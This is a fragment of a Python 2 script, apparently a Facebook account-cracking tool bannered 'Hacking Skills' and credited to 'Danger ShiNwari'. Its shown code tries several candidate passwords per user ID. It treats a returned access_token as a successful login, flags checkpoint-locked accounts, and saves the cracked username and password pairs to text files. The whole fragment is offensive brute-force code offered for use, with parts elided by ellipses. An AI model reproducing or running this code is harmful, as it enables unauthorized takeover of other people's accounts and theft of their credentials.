...
\033[1;97m                \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;97m Code By     : Danger ShiNwari

\033[1;97m Frinds  : Not Have

\033[1;97m YouTube : Hacking Skills

\033[1;97m Facebook : Hacking Skills
\033[1;97m--------------------------------------------------
"""
#call menu
def Furqan():
...
#clone Password
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m(ShiNwari_OK) ' + k + c + user + ' | ' + pass1
                okb = open('Shinwari.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;91m(ShiNwari_CP) ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m(ShiNwari_OK)' + k + c + user + ' | ' + pass2
                    okb = open('Qasim.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;91m(ShiNwari_CP) ' + k + c + user + ' | ' + pass2
                    okb = open('Qasim.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m(ShiNwari_OK) ' + k + c + user + ' | ' + pass3
                        okb = open('Qasim.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;91m(ShiNwari_CP) ' + k + c + user + ' | ' + pass3
                        cps = open('Qasim.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m(ShiNwari_OK) ' + k + c + user + ' | ' + pass4
                            okb = open('Qasim.txt', 'a')
